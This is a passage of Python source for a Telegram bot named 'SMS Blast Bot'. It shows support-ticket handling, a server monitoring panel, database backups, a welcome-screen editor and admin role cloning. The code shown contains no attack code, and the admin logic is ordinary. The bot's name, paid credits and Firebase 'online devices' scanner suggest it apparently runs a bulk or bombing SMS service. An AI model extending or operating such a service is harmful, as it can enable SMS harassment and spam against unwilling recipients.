    rows = [[btn("ʀᴇᴘʟʏ", f"v5:ticketreply:{ticket_id}", EMOJI_CHECK, "↩️", style="success")]]
    if ticket.get("status") != "closed":
        rows.append([btn("ᴄʟᴏsᴇ ᴛɪᴄᴋᴇᴛ", f"v5:ticketclose:{ticket_id}", EMOJI_CROSS, "🔒", style="danger")])
    rows.append([btn("ɪɴʙᴏx", "v5:tickets", EMOJI_BELL, "🎫")])
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data.startswith("v5:ticketreply:"))
async def v5_ticket_reply_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    ticket_id = cq.data.split(":", 2)[2]
    if not _v5_ticket_find(d, ticket_id):
        await cq.answer("Ticket not found.", show_alert=True)
        return
    await state.update_data(v5_ticket_id=ticket_id)
    await state.set_state(S.v5_ticket_reply)
    await safe_edit(cq.message, f"↩️ <b>Reply to { _v5_safe(ticket_id) }</b>\n\nSend your reply (max 1500 characters).", reply_markup=kb([(f"{sc('cancel')}", "v5:tickets")]), parse_mode="HTML")
    await cq.answer()


@R.message(S.v5_ticket_reply)
async def v5_ticket_reply_send(msg: Message, state: FSMContext):
    d = load()
    manager_id = msg.from_user.id
    if not is_admin(manager_id, d):
        await state.clear()
        return
    data = await state.get_data()
    ticket_id = data.get("v5_ticket_id")
    ticket = _v5_ticket_find(d, ticket_id)
    body = (msg.text or "").strip()
    if not ticket:
        await state.clear()
        await msg.answer("Ticket no longer exists.")
        return
    if not body or len(body) > 1500:
        await msg.answer("Please send a text reply (1–1500 characters).")
        return
    ticket.setdefault("replies", []).append({"by": manager_id, "text": body, "timestamp": int(time.time())})
    ticket["status"] = "responded"
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(int(ticket["uid"]), f"🎫 <b>Support replied</b> · <code>{_v5_safe(ticket_id)}</code>\n\n{_v5_safe(body)}", parse_mode="HTML")
        notice = "Reply saved and delivered to the user."
    except Exception:
        notice = "Reply saved, but Telegram could not deliver the message to the user."
    await msg.answer(f"✅ {notice}", reply_markup=kb([(f"{sc('support inbox')}", "v5:tickets")]))


@R.callback_query(F.data.startswith("v5:ticketclose:"))
async def v5_ticket_close(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    ticket_id = cq.data.split(":", 2)[2]
    ticket = _v5_ticket_find(d, ticket_id)
    if not ticket:
        await cq.answer("Ticket not found.", show_alert=True)
        return
    ticket["status"] = "closed"
    ticket["closed_at"] = int(time.time())
    save(d)
    tickets = d.get("support_tickets", [])
    open_tickets = [t for t in tickets if t.get("status") in {"open", "responded"}]
    rows = []
    for item in reversed(open_tickets[-15:]):
        rows.append([btn(f"{item.get('id')} · {str(item.get('status', 'open')).upper()}", f"v5:ticket:{item.get('id')}", EMOJI_BELL, "🎫")])
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    rows.append([btn("ʙᴀᴄᴋ", back, EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, f"🎫 <b>Support Inbox</b>\n\nOpen/responded: <b>{len(open_tickets)}</b>\nTotal tickets: <b>{len(tickets)}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await cq.answer("Ticket closed.", show_alert=True)


# ==================== V5.1 OPERATIONS CONTROL CENTRE ====================
V51_STARTED_AT = time.time()
V51_BACKUP_DIR = os.path.join(os.path.dirname(os.path.abspath(_DATA_FILE)) or ".", "backups")
V51_ERROR_FILE = os.path.join(os.path.dirname(os.path.abspath(_DATA_FILE)) or ".", "v5_error_events.json")
V51_BACKUP_TASK = None


def v51_record_error(area: str, exc: Exception):
    """Separate V5.1 diagnostic store; existing application logging is intentionally untouched."""
    try:
        events = []
        if os.path.exists(V51_ERROR_FILE):
            with open(V51_ERROR_FILE, "r", encoding="utf-8") as f:
                loaded = json.load(f)
                events = loaded if isinstance(loaded, list) else []
        events.append({"timestamp": int(time.time()), "area": str(area)[:80], "error": str(exc)[:500]})
        with open(V51_ERROR_FILE, "w", encoding="utf-8") as f:
            json.dump(events[-300:], f, indent=2, ensure_ascii=False)
    except Exception:
        pass


def v51_bytes(n: int) -> str:
    value = float(max(0, n))
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if value < 1024 or unit == "TB":
            return f"{value:.1f} {unit}"
        value /= 1024


def v51_disk_info() -> str:
    total, used, free = shutil.disk_usage(os.path.abspath("."))
    pct = (used / total * 100) if total else 0
    data_size = os.path.getsize(_DATA_FILE) if os.path.exists(_DATA_FILE) else 0
    backup_size = 0
    if os.path.isdir(V51_BACKUP_DIR):
        for name in os.listdir(V51_BACKUP_DIR):
            path = os.path.join(V51_BACKUP_DIR, name)
            if os.path.isfile(path):
                backup_size += os.path.getsize(path)
    return (f"Disk used: <b>{v51_bytes(used)}</b> / {v51_bytes(total)} ({pct:.1f}%)\n"
            f"Free space: <b>{v51_bytes(free)}</b>\n"
            f"Database: <b>{v51_bytes(data_size)}</b>\n"
            f"Local backups: <b>{v51_bytes(backup_size)}</b>")


def v51_process_memory() -> str:
    try:
        import psutil
        return v51_bytes(psutil.Process(os.getpid()).memory_info().rss)
    except Exception:
        try:
            import resource
            return v51_bytes(resource.getrusage(resource.RUSAGE_SELF).ru_maxrss * (1024 if sys.platform != "darwin" else 1))
        except Exception:
            return "Unavailable"


def v51_monitor_text() -> str:
    uptime = int(time.time() - V51_STARTED_AT)
    active = sum(1 for x in USER_SESSIONS.values() if x.task and not x.task.done())
    last_scan = "Never" if not LAST_SCAN_TIME else fmt_time(int(LAST_SCAN_TIME))
    scan_age = "n/a" if not LAST_SCAN_TIME else f"{int(time.time()-LAST_SCAN_TIME)} sec ago"
    backup_state = "running" if V51_BACKUP_TASK and not V51_BACKUP_TASK.done() else "not tracked / stopped"
    return ("📡 <b>LIVE OPERATIONS MONITOR</b>\n\n"
            f"Bot process: <b>ONLINE</b>\nUptime: <b>{uptime//3600}h {(uptime%3600)//60}m</b>\n"
            f"Active sessions: <b>{active}</b>\nFirebase scanner: <b>{'SCANNING' if SCANNING_IN_PROGRESS else 'IDLE'}</b>\n"
            f"Scanner status: {SCAN_STATUS}\nLast scan: <b>{last_scan}</b> ({scan_age})\n"
            f"Cached devices: <b>{len(CACHED_DEVICES)}</b>\nHourly backup task: <b>{backup_state}</b>\n"
            f"Process memory: <b>{v51_process_memory()}</b>")


def v51_system_text() -> str:
    try:
        loadavg = " / ".join(f"{x:.2f}" for x in os.getloadavg())
    except Exception:
        loadavg = "Unavailable"
    return ("🖥 <b>SERVER & SYSTEM</b>\n\n"
            f"Hostname: <code>{_v5_safe(platform.node() or 'unknown')}</code>\n"
            f"OS: <b>{_v5_safe(platform.system())} { _v5_safe(platform.release()) }</b>\n"
            f"Python: <b>{_v5_safe(platform.python_version())}</b>\n"
            f"Architecture: <b>{_v5_safe(platform.machine())}</b>\n"
            f"CPU count: <b>{os.cpu_count() or 'unknown'}</b>\n"
            f"Load average (1/5/15m): <b>{loadavg}</b>\n"
            f"Process memory: <b>{v51_process_memory()}</b>\n\n{v51_disk_info()}")


async def v51_send_welcome(bot: Bot, chat_id: int, d: dict):
    cfg = d.get("v5_start_screen", {})
    text = (cfg.get("welcome_text") or "").strip()
    video_id = (cfg.get("welcome_video_file_id") or "").strip()
    if not text and not video_id:
        return
    try:
        if video_id:
            await bot.send_video(chat_id, video=video_id, caption=(text[:1024] if text else None), parse_mode="HTML")
        elif text:
            await bot.send_message(chat_id, text[:4000], parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        v51_record_error("welcome_studio_delivery", e)
        try:
            await bot.send_message(chat_id, "Welcome! Use the menu below to continue.")
        except Exception:
            pass


def v51_panel_markup(uid: int, owner_only: bool = False):
    rows = [
        [btn("📡 Live Monitor", "v51:monitor", style="success"), btn("🖥 Server / System", "v51:system")],
        [btn("💽 Storage", "v51:storage"), btn("🧯 Error Logs", "v51:errors", style="danger")],
        [btn("🔥 Firebase Monitor", "v51:firebase"), btn("🔍 Daily Searches", "v51:dailysearch")],
    ]
    if owner_only:
        rows += [
            [btn("📦 Backup Manager", "v51:backups", style="success"), btn("🎬 Welcome Studio", "v51:studio")],
            [btn("👥 Clone Manager", "v51:clone")],
        ]
    rows.append([btn("🔄 Refresh Panel", "owner:refresh" if is_owner(uid, load()) else "admin:refresh", style="success")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


@R.callback_query(F.data == "v51:monitor")
async def v51_monitor(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    await safe_edit(cq.message,v51_monitor_text(),reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    await cq.answer("Monitor refreshed")


@R.callback_query(F.data == "v51:system")
async def v51_system(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    try:
        text=v51_system_text()
        await safe_edit(cq.message,text,reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    except Exception as e:
        v51_record_error("system_dashboard",e)
        await cq.answer("System dashboard error recorded",show_alert=True); return
    await cq.answer()


@R.callback_query(F.data == "v51:storage")
async def v51_storage(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    try:
        await safe_edit(cq.message,"💽 <b>STORAGE OVERVIEW</b>\n\n"+v51_disk_info(),reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    except Exception as e:
        v51_record_error("storage_dashboard",e); await cq.answer("Storage check failed",show_alert=True); return
    await cq.answer()


@R.callback_query(F.data == "v51:firebase")
async def v51_firebase(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    fbs=d.get("firebases",[])
    lines=["🔥 <b>FIREBASE AUTO-CHECK MONITOR</b>","",f"Configured endpoints: <b>{len(fbs)}</b>",f"Scanner: <b>{'RUNNING' if SCANNING_IN_PROGRESS or LAST_SCAN_TIME else 'WAITING FOR FIRST SCAN'}</b>",f"Last scan: <b>{fmt_time(int(LAST_SCAN_TIME)) if LAST_SCAN_TIME else 'Not yet scanned'}</b>",f"Cached online devices: <b>{len(CACHED_DEVICES)}</b>",f"Status: {SCAN_STATUS}","","<i>Read-only health view. The existing scanner remains enabled; no Firebase credentials or endpoint URLs are exposed here.</i>"]
    for item in list(FB_DEVICE_COUNTS.values())[:12]:
        age=max(0,int(time.time())-int(item.get("last_update",0)))
        lines.append(f"• {_v5_safe(item.get('label','Firebase'))}: <b>{int(item.get('online',0))} online</b> · updated {age}s ago")
    await safe_edit(cq.message,"\n".join(lines),reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:errors")
async def v51_errors(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    events=[]
    try:
        if os.path.exists(V51_ERROR_FILE):
            with open(V51_ERROR_FILE,"r",encoding="utf-8") as f: events=json.load(f)
            if not isinstance(events,list): events=[]
    except Exception as e: v51_record_error("error_log_read",e)
    lines=["🧯 <b>V5.1 MODULE ERROR EVENTS</b>","",f"Stored events: <b>{len(events)}</b>","<i>This panel reports errors captured by V5.1 modules. It does not rewrite or replace the existing application logger.</i>"]
    for ev in events[-8:][::-1]:
        lines.append(f"\n<code>{fmt_time(int(ev.get('timestamp',0)))}</code> · <b>{_v5_safe(ev.get('area'))}</b>\n{_v5_safe(ev.get('error'))[:260]}")
    await safe_edit(cq.message,"\n".join(lines),reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:backups")
async def v51_backups(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_owner(cq.from_user.id,d): return await cq.answer("Owner only",show_alert=True)
    os.makedirs(V51_BACKUP_DIR,exist_ok=True)
    files=sorted([x for x in os.listdir(V51_BACKUP_DIR) if x.endswith(".json")],reverse=True)
    rows=[[btn("➕ Create Manual Backup","v51:backup:create",style="success")]]
    for name in files[:8]: rows.append([btn(name[:48],"v51:backup:send:"+name)])
    rows += [[btn("📤 Send Current Database","v51:backup:sendcurrent",style="primary")],[btn("⏱ Auto Backup Status","v51:backup:auto")],[btn("🔄 Refresh","v51:backups",style="success")],[btn("🔙 Owner Panel","owner:home")]]
    text=("📦 <b>BACKUP MANAGER</b>\n\n"
          "Automatic backup: <b>Hourly to the configured log channel</b> (existing task retained)\n"
          f"Local backup files: <b>{len(files)}</b>\nDirectory: <code>{_v5_safe(V51_BACKUP_DIR)}</code>\n\n"
          "Create a timestamped snapshot or send a saved backup to the owner chat.")
    await safe_edit(cq.message,text,reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:backup:auto")
async def v51_backup_auto_status(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    running=bool(V51_BACKUP_TASK and not V51_BACKUP_TASK.done())
    text=("⏱ <b>AUTOMATIC BACKUP STATUS</b>\n\n"
          f"Task: <b>{'RUNNING' if running else 'NOT RUNNING'}</b>\n"
          "Schedule: <b>Every 60 minutes</b>\nDestination: <b>Configured Telegram log channel</b>\n"
          "Manual snapshots: <b>Local backups/ folder</b>\n\n"
          "The original hourly backup sender has been retained unchanged.")
    await safe_edit(cq.message,text,reply_markup=kb([("📦 Backup Manager","v51:backups"),("🏠 Owner Panel","owner:home")]),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:backup:create")
async def v51_backup_create(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    try:
        os.makedirs(V51_BACKUP_DIR,exist_ok=True)
        if not os.path.exists(_DATA_FILE): raise FileNotFoundError(_DATA_FILE)
        name="database_"+datetime.now().strftime("%Y%m%d_%H%M%S")+".json"
        with _DB_LOCK:
            shutil.copy2(_DATA_FILE,os.path.join(V51_BACKUP_DIR,name))
        await cq.answer("Backup created")
        await safe_edit(cq.message,f"✅ <b>Backup created</b>\n<code>{_v5_safe(name)}</code>",reply_markup=kb([( "📦 Backup Manager","v51:backups"),("🏠 Owner Panel","owner:home")]),parse_mode="HTML")
    except Exception as e:
        v51_record_error("backup_create",e); await cq.answer("Backup failed; see Error Logs",show_alert=True)


@R.callback_query(F.data == "v51:backup:sendcurrent")
async def v51_backup_send_current(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    try:
        if not os.path.exists(_DATA_FILE): raise FileNotFoundError(_DATA_FILE)
        await cq.message.answer_document(FSInputFile(_DATA_FILE),caption="Current database snapshot")
        await cq.answer("Sent to this chat")
    except Exception as e:
        v51_record_error("backup_send_current",e); await cq.answer("Send failed",show_alert=True)


@R.callback_query(F.data.startswith("v51:backup:send:"))
async def v51_backup_send_saved(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    name=cq.data.split(":",3)[3]
    if os.path.basename(name)!=name or not name.endswith(".json"): return await cq.answer("Invalid backup",show_alert=True)
    path=os.path.join(V51_BACKUP_DIR,name)
    if not os.path.isfile(path): return await cq.answer("Backup not found",show_alert=True)
    try:
        await cq.message.answer_document(FSInputFile(path),caption="Backup: "+name)
        await cq.answer("Backup sent")
    except Exception as e:
        v51_record_error("backup_send_saved",e); await cq.answer("Send failed",show_alert=True)


@R.callback_query(F.data == "v51:studio")
async def v51_studio(cq: CallbackQuery, state: FSMContext):
    d=load()
    if not is_owner(cq.from_user.id,d): return await cq.answer("Owner only",show_alert=True)
    cfg=d.get("v5_start_screen",{})
    text=("🎬 <b>WELCOME CUSTOMIZATION STUDIO</b>\n\n"
          f"Welcome text: <b>{'Configured' if cfg.get('welcome_text') else 'Default / empty'}</b>\n"
          f"Welcome video: <b>{'Configured' if cfg.get('welcome_video_file_id') else 'Not set'}</b>\n"
          f"Help text: <b>{'Customized' if cfg.get('help_text') else 'Default'}</b>\n\n"
          "These settings appear after /start (after force-join verification).")
    rows=[[btn("✏️ Set Welcome Text","v51:studio:text")],[btn("🎥 Set Welcome Video","v51:studio:video")],[btn("❔ Edit Help Text","v51:studio:help")],[btn("👁 Preview Start Screen","v51:studio:preview")],[btn("🧹 Clear Welcome Video","v51:studio:clearvideo",style="danger")],[btn("🔙 Owner Panel","owner:home")]]
    await safe_edit(cq.message,text,reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:studio:text")
async def v51_studio_text_start(cq: CallbackQuery,state:FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    await state.set_state(S.v5_studio_text)
    await safe_edit(cq.message,"Send the welcome caption/text (up to 1000 characters). HTML formatting is supported. Send /cancel to keep the current value.",reply_markup=kb([("Cancel","v51:studio")]))
    await cq.answer()


@R.message(S.v5_studio_text)
async def v51_studio_text_save(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id,load()): await state.clear(); return
    value=(msg.text or "").strip()
    if value=="/cancel": await state.clear(); return await msg.answer("No changes made.")
    if not value or len(value)>1000: return await msg.answer("Please send 1–1000 characters.")
    d=load(); d.setdefault("v5_start_screen",{})["welcome_text"]=value; save(d); await state.clear()
    await msg.answer("✅ Welcome text saved.",reply_markup=kb([("🎬 Welcome Studio","v51:studio")]))


@R.callback_query(F.data == "v51:studio:video")
async def v51_studio_video_start(cq:CallbackQuery,state:FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    await state.set_state(S.v5_studio_video)
    await safe_edit(cq.message,"Send the welcome video as a Telegram video. The bot stores its file_id and reuses it on /start.",reply_markup=kb([("Cancel","v51:studio")]))
    await cq.answer()


@R.message(S.v5_studio_video)
async def v51_studio_video_save(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id,load()): await state.clear(); return
    if not msg.video: return await msg.answer("Please send a video file, not a link or document.")
    d=load(); d.setdefault("v5_start_screen",{})["welcome_video_file_id"]=msg.video.file_id; save(d); await state.clear()
    await msg.answer("✅ Welcome video saved.",reply_markup=kb([("🎬 Welcome Studio","v51:studio")]))


@R.callback_query(F.data == "v51:studio:preview")
async def v51_studio_preview(cq:CallbackQuery,state:FSMContext):
    d=load()
    if not is_owner(cq.from_user.id,d): return await cq.answer("Owner only",show_alert=True)
    cfg=d.get("v5_start_screen",{})
    if not cfg.get("welcome_text") and not cfg.get("welcome_video_file_id"):
        await cq.answer("No welcome content configured yet",show_alert=True); return
    await v51_send_welcome(cq.bot,cq.message.chat.id,d)
    await cq.answer("Preview sent")


@R.callback_query(F.data == "v51:studio:clearvideo")
async def v51_studio_clear_video(cq:CallbackQuery,state:FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    d=load(); d.setdefault("v5_start_screen",{})["welcome_video_file_id"]=""; save(d)
    await v51_studio(cq,state)


@R.callback_query(F.data == "v51:studio:help")
async def v51_studio_help_start(cq:CallbackQuery,state:FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    await state.set_state(S.v5_studio_help)
    await safe_edit(cq.message,"Send the new help text (up to 3000 characters).",reply_markup=kb([("Cancel","v51:studio")]))
    await cq.answer()


@R.message(S.v5_studio_help)
async def v51_studio_help_save(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id,load()): await state.clear(); return
    value=(msg.text or "").strip()
    if not value or len(value)>3000: return await msg.answer("Please send 1–3000 characters.")
    d=load(); d.setdefault("v5_start_screen",{})["help_text"]=value; save(d); await state.clear()
    await msg.answer("✅ Help text saved.",reply_markup=kb([("🎬 Welcome Studio","v51:studio")]))


@R.callback_query(F.data == "v51:help")
async def v51_help(cq:CallbackQuery,state:FSMContext):
    d=load(); cfg=d.get("v5_start_screen",{})
    text=cfg.get("help_text") or "Use the menu buttons to navigate. For account or technical issues, open Support Ticket. Never share OTPs or passwords."
    await safe_edit(cq.message,"❔ <b>HELP CENTRE</b>\n\n"+text,reply_markup=kb([("🎫 Support Ticket","v5:support"),("🔙 Home","user:home")]),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:dailysearch")
async def v51_daily_searches(cq:CallbackQuery,state:FSMContext):
    d=load()
    if not is_admin(cq.from_user.id,d): return await cq.answer("Manager access required",show_alert=True)
    today=datetime.now().strftime("%Y-%m-%d")
    searches=[x for x in d.get("v5_searches",[]) if datetime.fromtimestamp(int(x.get("timestamp",0))).strftime("%Y-%m-%d")==today]
    by_manager=defaultdict(int)
    for item in searches: by_manager[str(item.get("manager_id"))]+=1
    lines=["🔍 <b>DAILY USER SEARCH REPORT</b>","",f"Date: <b>{today}</b>",f"Total user searches: <b>{len(searches)}</b>"]
    for mid,count in sorted(by_manager.items(),key=lambda x:x[1],reverse=True)[:10]: lines.append(f"• Manager <code>{mid}</code>: <b>{count}</b>")
    lines.append("\n<i>Search events are recorded from V5.1 lookup actions onward.</i>")
    await safe_edit(cq.message,"\n".join(lines),reply_markup=v51_panel_markup(cq.from_user.id,is_owner(cq.from_user.id,d)),parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v51:clone")
async def v51_clone_start(cq:CallbackQuery,state:FSMContext):
    if not is_owner(cq.from_user.id,load()): return await cq.answer("Owner only",show_alert=True)
    await state.set_state(S.v5_clone_source)
    await safe_edit(cq.message,"👥 <b>Clone Manager Role</b>\n\nSend the Telegram ID of an existing admin whose manager role you want to copy. This copies only the standard admin role, never owner access.",reply_markup=kb([("Cancel","owner:home")]),parse_mode="HTML")
    await cq.answer()


@R.message(S.v5_clone_source)
async def v51_clone_source(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id,load()): await state.clear(); return
    raw=(msg.text or "").strip()
    if not raw.isdigit() or int(raw) not in load().get("admins",[]): return await msg.answer("Enter an existing admin Telegram ID.")
    await state.update_data(v51_clone_source=int(raw)); await state.set_state(S.v5_clone_target)
    await msg.answer("Now send the target user's Telegram ID. They must already be registered in this bot.")


@R.message(S.v5_clone_target)
async def v51_clone_target(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id,load()): await state.clear(); return
    raw=(msg.text or "").strip(); d=load(); data=await state.get_data(); source=int(data.get("v51_clone_source",0))
    if not raw.isdigit(): return await msg.answer("Send a numeric Telegram ID.")
    target=int(raw)
    if str(target) not in d.get("users",{}): return await msg.answer("Target must be a registered user.")
    if target==MAIN_OWNER or target in d.get("owners",[]): return await msg.answer("Owner accounts cannot be overwritten by manager cloning.")
    if target in d.get("banned",[]): return await msg.answer("Unban the target account before assigning a manager role.")
    if target==source: return await msg.answer("Source and target must be different.")
    await state.update_data(v51_clone_target=target)
    await state.set_state(S.v5_clone_confirm)
    await msg.answer(f"⚠️ <b>Confirm manager role copy</b>\n\nSource admin: <code>{source}</code>\nTarget user: <code>{target}</code>\n\nThis grants the standard admin permission set only. Owner permissions are not copied.",parse_mode="HTML",reply_markup=kb([("✅ Confirm clone","v51:clone:confirm"),("❌ Cancel","owner:home")]))


@R.callback_query(F.data == "v51:clone:confirm")
async def v51_clone_confirm(cq:CallbackQuery,state:FSMContext):
    d=load()
    if not is_owner(cq.from_user.id,d): await state.clear(); return await cq.answer("Owner only",show_alert=True)
    data=await state.get_data(); source=int(data.get("v51_clone_source",0)); target=int(data.get("v51_clone_target",0))
    if source not in d.get("admins",[]) or str(target) not in d.get("users",{}) or target in d.get("banned",[]) or target in d.get("owners",[]):
        await state.clear(); return await cq.answer("Role copy validation failed; no change made.",show_alert=True)
    if target not in d.setdefault("admins",[]): d["admins"].append(target)
    save(d); await state.clear()
    await safe_edit(cq.message,f"✅ <b>Manager role copied</b>\nSource: <code>{source}</code>\nTarget: <code>{target}</code>\nOwner permissions were not copied.",reply_markup=kb([("👑 Owner Panel","owner:home")]),parse_mode="HTML")
    await cq.answer("Admin role assigned")



async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    global V51_BACKUP_TASK
    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    backup_task = asyncio.create_task(background_backup_sender(bot))
    V51_BACKUP_TASK = backup_task
    log.info("Background scanner & backup tasks created")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} <b>Background Scanner:</b> Starting...\n"
            f"📦 <b>Auto Database Backup:</b> Every 1 Hour -> Log Channel\n"
            f"{em(EMOJI_WARNING, '⏱')} Auto-Scan Interval: <b>1 minute</b>\n"
            f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
            f"{em(EMOJI_ROCKET, '🚀')} <b>Concurrent Users:</b> 1000+\n"
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Section & Auto-Send:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED (With Yes/No & Protection)\n"
            f"👤 <b>Bot Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
